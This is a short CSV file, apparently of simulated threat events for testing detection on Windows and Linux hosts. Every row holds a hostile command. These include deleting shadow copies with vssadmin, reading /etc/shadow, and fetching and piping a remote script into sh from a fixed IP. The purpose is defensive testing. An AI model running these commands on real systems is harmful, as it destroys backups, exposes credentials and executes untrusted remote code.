id,simulation_type,description,enabled,dest,parent_process,process
PROC-TE-01,Threat Event,Vssadmin being used to delete shadow copies,true,WKS01,C:\Windows\system32\cmd.exe,vssadmin.exe delete shadows
PROC-TE-02,Threat Event,Whoami being used for local groups recon,true,WKS01,C:\Windows\system32\cmd.exe,whoami /groups
PROC-TE-03,Threat Event,Process enumeration/discovery via tasklist,true,WKS01,C:\Windows\system32\cmd.exe,tasklist
PROC-TE-04,Threat Event,Apache2 webserver process spawning whoami (webshell recon),true,SRV01,/usr/sbin/apache2,/usr/bin/whoami
PROC-TE-05,Threat Event,Wget being used to download a shell script from a remote IP,true,UBUNTU01,/bin/bash,wget http://193.176.183.245/a.sh
PROC-TE-06,Threat Event,Reading /etc/passwd,true,UBUNTU01,/bin/bash,cat /etc/passwd
PROC-TE-07,Threat Event,Reading /etc/shadow,true,UBUNTU01,/bin/bash,cat /etc/shadow
PROC-TE-08,Threat Event,Unix/Linux in-memory curl cradle (fileless execution),true,UBUNTU01,/usr/bin/dash,curl http://193.176.183.245/ahdytg | sh